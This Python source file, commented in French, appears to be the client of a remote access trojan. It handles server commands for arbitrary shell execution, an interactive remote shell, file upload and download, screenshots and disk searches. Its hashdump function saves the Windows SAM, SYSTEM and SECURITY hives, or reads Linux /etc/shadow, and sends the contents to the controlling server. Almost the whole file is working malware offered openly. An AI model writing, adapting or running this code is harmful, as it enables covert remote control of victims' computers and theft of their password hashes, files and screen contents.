import os
import subprocess
import io
import base64
import platform
from PIL import ImageGrab
from colorama import Fore, Style

def colorama_etoile():
    return Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "*" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "


current_directory = os.getcwd()  # Répertoire de départ du script

# Exécute une commande système et retourne le résultat encodé en base64
def execute_command(command):
    global current_directory  # Utilise le répertoire courant global
    try:
        if command.startswith("cd"):
            # Extrait le chemin du répertoire de la commande cd
            path = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else os.path.expanduser("~")
            # Change le répertoire courant
            os.chdir(path)
            current_directory = os.getcwd()  # Met à jour le répertoire courant
            return base64.b64encode(f"{colorama_etoile()}Répertoire modifié : {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{current_directory}{Style.RESET_ALL}{Fore.RED}{Style.DIM}".encode())
        else:
            # Exécute n'importe quelle autre commande système
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
            return base64.b64encode(output)
    except Exception as e:
        error_message = f"Erreur dans la commande : {e}".encode('utf-8')
        return base64.b64encode(error_message)

# Détecte le système d'exploitation du client
def detect_os():
    return platform.system().lower()

# Envoie un fichier au serveur
def download_file_to_server(sock, file_path):
    # Vérifie si le fichier existe
    if not os.path.exists(file_path):
        print(f"Fichier {file_path} non trouvé.")
        sock.sendall("FILE_NOT_FOUND".encode())  # Informe le serveur que le fichier n'a pas été trouvé
        return

    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
            # Envoyer la taille du fichier
            sock.sendall(str(len(file_data)).encode() + b"\n")
            sock.sendall(file_data)
        print(f"Fichier {file_path} envoyé avec succès au serveur.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier {file_path}: {e}")

# Variante de la fonction précédente pour l'envoi de fichiers spécifiques au hashdump de Linux
def download_file_to_server_hashdump(sock, file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
            # Envoyer la taille du fichier
            sock.sendall(str(len(file_data)).encode() + b"\n")
            sock.sendall(file_data)
        print(f"Fichier {file_path} envoyé avec succès au serveur.")
    except FileNotFoundError:
        print(f"Fichier {file_path} non trouvé.")

# Réceptionne un fichier envoyé par le serveur
def upload_file_from_server(sock, file_path):
    # Reçois la taille du fichier
    file_size = int(sock.recv(1024).decode())
    with open(file_path, 'wb') as file:
        remaining = file_size
        while remaining > 0:
            data = sock.recv(1024)
            file.write(data)
            remaining -= len(data)
    print(f"Fichier {file_path} reçu avec succès du serveur.")

# Ouvre un shell interactif sur le client
def open_shell(sock):
    while True:
        command = sock.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            output = execute_command(command)
            sock.sendall(output)
        except Exception as e:
            sock.sendall(str(e).encode())

# Récupère la configuration réseau du client
def get_ipconfig(sock):
    os_type = detect_os() # Détermine le système d'exploitation
    command = "ipconfig" if os_type == "windows" else "ip a"

    # Exécute la commande appropriée en fonction de l'OS
    output = execute_command(command)
    sock.sendall(output)

# Prend une capture d'écran et l'envoie au serveur
def take_screenshot(sock):
    try:
        screenshot = ImageGrab.grab()
        with io.BytesIO() as bytes_io:
            screenshot.save(bytes_io, format="JPEG")
            bytes_io.seek(0)
            encoded_screenshot = base64.b64encode(bytes_io.read())
            sock.sendall(encoded_screenshot)
        sock.sendall(b"END_OF_SCREENSHOT")  # Signal de fin
        print("Capture d'écran envoyée avec succès.")
    except Exception as e:
        print(f"Erreur lors de la prise de capture d'écran: {e}")

# Recherche des fichiers sur le client et envoie les résultats au serveur
def search_file(sock, search_query, start_path):
    found_files = []
    try:
        for root, dirs, files in os.walk(start_path):
            for file in files:
                if search_query.lower() in file.lower():
                    found_files.append(os.path.join(root, file))
                    if len(found_files) >= 10:  # Envoyer par lot de 10 résultats
                        response = '\n'.join(found_files).encode()
                        encoded_response = base64.b64encode(response)
                        sock.sendall(encoded_response)
                        found_files = []  # Réinitialiser la liste pour le prochain lot

        # Envoyer les résultats restants, s'il y en a
        if found_files:
            response = '\n'.join(found_files).encode()
            encoded_response = base64.b64encode(response)
            sock.sendall(encoded_response)

        # Envoyer un signal de fin de recherche
        sock.sendall(base64.b64encode(b"END_OF_SEARCH"))

    except Exception as e:
        error_message = f"Search Error: {e}".encode('utf-8')
        sock.sendall(base64.b64encode(error_message))

# Envoie les données de hashdump au serveur. Pour Windows, cela inclut les fichiers SAM, SYSTEM et SECURITY.
# Pour Linux, cela inclut le contenu de /etc/shadow.
def hashdump(sock):
    os_type = detect_os()
    sock.sendall(os_type.encode())

    if os_type == "windows":
        # Sauvegarde et envoie les fichiers nécessaires pour le hashdump
        try:
            subprocess.run(["reg", "save", "HKLM\\SAM", "sam.save"], check=True)
            subprocess.run(["reg", "save", "HKLM\\SYSTEM", "system.save"], check=True)
            subprocess.run(["reg", "save", "HKLM\\SECURITY", "security.save"], check=True)
            
            # Utilise la fonction "download_file_to_server" pour envoyer les fichiers au serveur
            download_file_to_server(sock, "sam.save")
            download_file_to_server(sock, "system.save")
            download_file_to_server(sock, "security.save")
            
            # Nettoie les fichiers temporaires
            os.remove("sam.save")
            os.remove("system.save")
            os.remove("security.save")
        except subprocess.CalledProcessError as e:
            print(f"Erreur Windows hashdump: {e}")
    elif os_type == "linux":
        # Linux: Simule l'envoi du fichier /etc/shadow
        shadow_path = "/etc/shadow"
        download_file_to_server_hashdump(sock, shadow_path)

# Traite les commandes reçues du serveur
def handle_command(conn, cmd):
    if cmd.startswith("download"):
        file_path = cmd.split(" ", 1)[1]
        download_file_to_server(conn, file_path)
    elif cmd.startswith("upload"):
        file_path = cmd.split(" ", 1)[1]
        upload_file_from_server(conn, file_path)
    elif cmd.startswith("shell"):
        open_shell(conn)
    elif cmd.startswith("ipconfig"):
        get_ipconfig(conn)
    elif cmd.startswith("screenshot"):
        take_screenshot(conn)
    elif cmd.startswith("search"):
        parts = cmd.split(" ", 2)
        search_query = parts[1]
        start_path = parts[2] if len(parts) == 3 else "C:\\"
        search_file(conn, search_query, start_path)
    elif cmd.startswith("hashdump"):
        hashdump(conn)